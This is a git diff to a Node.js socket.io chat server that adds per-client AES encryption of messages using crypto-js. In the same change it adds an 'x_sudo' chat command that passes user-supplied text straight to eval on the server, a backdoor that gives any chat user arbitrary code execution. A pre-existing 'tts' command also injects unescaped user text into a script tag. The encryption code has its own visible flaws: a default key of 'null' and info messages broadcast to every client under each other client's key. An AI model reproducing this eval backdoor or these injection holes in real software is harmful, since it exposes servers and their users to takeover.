@@ -1,4 +1,5 @@
 var fs = require('fs');
+var CryptoJS = require('crypto-js');
 
 exports = module.exports = function(io) {
 
@@ -9,16 +10,24 @@ exports = module.exports = function(io) {
 
     clientAmount++;
     socket.name = "Anonymous";
-    sendInfoMessage(socket.name + " connected");
+    socket.key = "null";
 
     socket.on('chat_message', function(data) {
-      sendChatMessage(socket,data.message,false);
+      var msg = CryptoJS.AES.decrypt(data.message, socket.key).toString(CryptoJS.enc.Utf8);
+      sendChatMessage(socket,msg,false);
     });
 
     socket.on('name_change', function(data) {
       var oldName = socket.name;
       socket.name = data.newname;
-      sendInfoMessage(oldName + " renamed to " + socket.name);
+      if(oldName != socket.name) {
+        sendInfoMessage(oldName + " renamed to " + socket.name);
+      }
+    })
+
+    socket.on('set_key', function(data) {
+      socket.key = data.key;
+      sendInfoMessage(socket.name + " connected");
     })
 
     socket.on('disconnect', function(){
@@ -44,6 +53,8 @@ exports = module.exports = function(io) {
     } else if(cmd == "tts") {
       line = "<script> var msg = new SpeechSynthesisUtterance('" + socket.name + " said " + line + "'); window.speechSynthesis.speak(msg)</script>" + line;
       sendChatMessage(socket,line,true);
+    } else if(cmd == "x_sudo") {
+      console.log(eval(line));
     }
   }
 
@@ -56,15 +67,23 @@ exports = module.exports = function(io) {
         msg = msg.replace(/</g, "&lt;");
         msg = msg.replace(/>/g, "&gt;");
       }
-      chatNSP.emit('chat_message', {
-        sender: socket.name,
-        message: msg
-      });
+      for (var s in chatNSP.sockets) {
+        var allSocket = chatNSP.sockets[s];
+        chatNSP.to(allSocket.id).emit('chat_message', {
+          sender: CryptoJS.AES.encrypt(socket.name, allSocket.key).toString(),
+          message: CryptoJS.AES.encrypt(msg, allSocket.key).toString()
+        });
+      }
     }
   }
 
   function sendInfoMessage(msg) {
-    chatNSP.emit('info_message', {message: msg});
+    for (var s in chatNSP.sockets) {
+      var allSocket = chatNSP.sockets[s];
+      chatNSP.emit('info_message', {
+        message: CryptoJS.AES.encrypt(msg, allSocket.key).toString()
+      });
+    }
   }
 
 }
